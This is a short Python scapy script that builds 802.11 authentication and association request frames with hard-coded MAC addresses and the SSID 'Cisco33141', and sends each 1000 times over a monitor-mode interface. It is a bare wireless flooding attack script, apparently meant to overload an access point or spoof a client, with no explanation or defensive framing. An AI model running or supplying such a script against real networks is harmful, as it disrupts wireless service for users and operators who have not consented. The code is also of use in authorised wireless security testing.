from scapy.all import *

packet = RadioTap()/Dot11(addr1='20:aa:4b:f3:7e:b0', addr2='e8:2a:ea:06:08:93', addr3='20:aa:4b:f3:7e:b0')/\
         Dot11Auth(algo=0, seqnum=0x0001, status=0x0000)

pkt = sendp(packet, iface='wlan0mon', count=1000)
print(pkt)

packet = RadioTap()/Dot11(addr1='20:aa:4b:f3:7e:b0', addr2='e8:2a:ea:06:08:93', addr3='20:aa:4b:f3:7e:b0')/\
Dot11AssoReq(cap=0x1100, listen_interval=0x00a)/\
Dot11Elt(ID=0, info="Cisco33141")

pkt = sendp(packet, iface='wlan0mon', count=1000)
